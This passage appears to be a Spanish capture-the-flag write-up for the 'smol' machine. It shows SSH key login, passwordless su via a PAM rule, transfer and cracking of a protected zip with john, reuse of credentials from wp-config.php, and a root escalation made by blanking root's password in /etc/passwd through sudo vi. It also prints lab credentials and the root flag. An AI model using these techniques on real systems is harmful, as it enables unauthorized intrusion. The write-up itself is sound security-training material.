> Maquina HOST

```shell
nano id_rsa

#Dentro del nano
<ID_RSA_THINK>
```

Lo guardamos y establecemos los permisos necesarios.

```shell
chmod 600 id_rsa
```

Ahora nos vamos a conectar por `SSH` mediante la clave `PEM`.

### SSH

```shell
ssh -i id_rsa think@<IP>
```

Info:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Apr 2025 06:48:02 AM UTC

  System load:  0.17              Processes:                205
  Usage of /:   55.9% of 9.75GB   Users logged in:          0
  Memory usage: 32%               IPv4 address for enp0s17: 192.168.1.169
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

think@smol:~$ whoami
think
```

Echo esto veremos que estamos dentro.

## Escalate user gege

Despues de una busqueda intensiva, si leemos el siguiente archivo veremos lo siguiente:

```shell
cat /etc/pam.d/su | grep "gege"
```

Info:

```
auth  [success=ignore default=1] pam_succeed_if.so user = gege
```

Vemos que si ahora realizamos lo siguiente podremos escalar a dicho usuario sin ningun tipo de `password`, por lo que haremos lo siguiente:

```shell
su gege
```

Y con esto ya seremos dicho usuario.

## Escalate user xavi

Si vemos nuestra `home` veremos el siguiente archivo `wordpress.old.zip`, si intentamos descomprimirlo veremos que nos pide una contraseña, por lo que vamos a probar a `crackear` la contraseña de la siguiente forma.

Vamos abrir un servidor de `python` para pasarnos el archivo a nuestro `host`.

```shell
python3 -m http.server 8000
```

Ahora en nuestro `host` haremos lo siguiente:

```shell
wget http://<IP>:8000/wordpress.old.zip
```

Una vez que ya tengamos el archivo obtendremos el `hash` del `ZIP`.

```shell
zip2john wordpress.old.zip > hash.zip
```

Vamos a `crackearlo` con `john` de la siguiente forma:

```shell
john --wordlist=<WORDLIST> hash.zip
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-04-08 05:42) 1.785g/s 13611Kp/s 13611Kc/s 13611KC/s hesse..hermosa_jessy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos obtenido la contraseña de forma correcta, por lo que vamos a utilizarla ahora para descomprimir dicho archivo.

```shell
unzip wordpress.old.zip
```

Ahora si entramos en la carpeta descomprimida, veremos el famoso archivo de configuracion para la conexion de la `DDBB` a `wordpress`, pero si lo leemos veremos que tiene otras credenciales, en este caso el del usuario `xavi`.

```shell
cat wp-config.php
```

Info:

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Veremos esta parte interesante aqui:

```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Por lo que vemos las credenciales seran:

```
User: xavi
Pass: P@ssw0rdxavi@
```

Por lo que las probaremos:

```shell
su xavi
```

Metemos como contraseña `P@ssw0rdxavi@` y veremos que seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) /usr/bin/vi /etc/passwd
```

Veremos que podemos editar el archivo `passwd` con el editor de texto llamado `vi` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo vi /etc/passwd

#Dentro del vi
root::0:0:root:/root:/usr/bin/bash #Quitaremos la "x" para quitarle la contraseña a root
```

Guardamos el archivo y ahora realizaremos lo siguiente:

```shell
su root
```

Info:

```
root@smol:/home/xavi$ whoami
root
```

Y con esto ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
bf89ea3ea01992353aef1f576214d4e4
```
